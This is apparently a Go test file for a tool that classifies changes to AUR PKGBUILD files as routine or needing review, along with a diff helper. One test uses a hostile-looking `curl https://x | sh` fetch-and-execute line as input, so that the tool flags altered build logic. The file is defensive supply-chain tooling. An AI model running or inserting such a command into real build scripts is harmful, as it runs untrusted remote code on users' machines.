package aurreview

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

const basePKGBUILD = `pkgname=foo
pkgver=1.0
pkgrel=1
_commit=abc123
pkgdesc="demo"
depends=(
  'glibc'
)
source=("https://example.com/foo-$pkgver.tar.gz")
sha256sums=('aaaa'
            'bbbb')

package() {
  install -Dm755 foo "$pkgdir/usr/bin/foo"
}
`

func bump(s string, pairs ...string) string {
	return strings.NewReplacer(pairs...).Replace(s)
}

func TestClassify_versionBumpIsRoutine(t *testing.T) {
	next := bump(basePKGBUILD, "pkgver=1.0", "pkgver=1.1", "_commit=abc123", "_commit=def456", "'aaaa'", "'cccc'")
	c := classify(map[string]string{"PKGBUILD": basePKGBUILD}, map[string]string{"PKGBUILD": next, ".SRCINFO": "x"})
	require.True(t, c.Baseline)
	require.True(t, c.Routine)
	require.Equal(t, "pkgver + checksums", c.Summary)
	require.Len(t, c.Files, 1, ".SRCINFO is generated and never diffed")
	require.Contains(t, c.Files[0].Lines, "-pkgver=1.0")
	require.Contains(t, c.Files[0].Lines, "+pkgver=1.1")
}

func TestClassify_buildLogicIsNotRoutine(t *testing.T) {
	next := bump(basePKGBUILD, `install -Dm755 foo "$pkgdir/usr/bin/foo"`, `curl https://x | sh`)
	c := classify(map[string]string{"PKGBUILD": basePKGBUILD}, map[string]string{"PKGBUILD": next})
	require.False(t, c.Routine)
	require.Equal(t, "package()", c.Summary)
}

func TestClassify_braceOnNextLineStaysInFunction(t *testing.T) {
	prev := "pkgver=1\nbuild()\n{\n  make\n}\n"
	next := "pkgver=1\nbuild()\n{\n  make evil\n}\n"
	c := classify(map[string]string{"PKGBUILD": prev}, map[string]string{"PKGBUILD": next})
	require.Equal(t, "build()", c.Summary)
	require.False(t, c.Routine)
}

func TestClassify_sourceAndNewDependencyExpand(t *testing.T) {
	next := bump(basePKGBUILD, "  'glibc'\n", "  'glibc'\n  'evil-lib'\n", "example.com", "example.net")
	c := classify(map[string]string{"PKGBUILD": basePKGBUILD}, map[string]string{"PKGBUILD": next})
	require.False(t, c.Routine)
	require.Equal(t, "depends + source", c.Summary)
}

func TestClassify_droppedDependencyIsRoutine(t *testing.T) {
	prev := bump(basePKGBUILD, "  'glibc'\n", "  'glibc'\n  'zlib'\n")
	c := classify(map[string]string{"PKGBUILD": prev}, map[string]string{"PKGBUILD": basePKGBUILD})
	require.True(t, c.Routine)
	require.Equal(t, "depends", c.Summary)
}

func TestClassify_newFilesAreNamed(t *testing.T) {
	c := classify(
		map[string]string{"PKGBUILD": basePKGBUILD, ".gitignore": "a"},
		map[string]string{"PKGBUILD": basePKGBUILD, ".gitignore": "b", "foo.install": "post_install() { :; }"},
	)
	require.False(t, c.Routine)
	require.Equal(t, "metadata + +foo.install", c.Summary)
}

func TestClassify_noBaseline(t *testing.T) {
	c := classify(nil, map[string]string{"PKGBUILD": "pkgver=1\n"})
	require.False(t, c.Baseline)
	require.False(t, c.Routine)
	require.Equal(t, "no trusted snapshot", c.Summary)
	require.Equal(t, []string{"@@ -1,0 +1,1 @@", "+pkgver=1"}, c.Files[0].Lines)
}

func TestUnifiedDiff_hunksWithContext(t *testing.T) {
	before := "a\nb\nc\nd\ne\nf\ng\nh\ni\nj\n"
	after := "a\nB\nc\nd\ne\nf\ng\nh\ni\nJ\n"
	require.Equal(t, []string{
		"@@ -1,5 +1,5 @@", " a", "-b", "+B", " c", " d", " e",
		"@@ -7,4 +7,4 @@", " g", " h", " i", "-j", "+J",
	}, unifiedDiff(before, after))
}
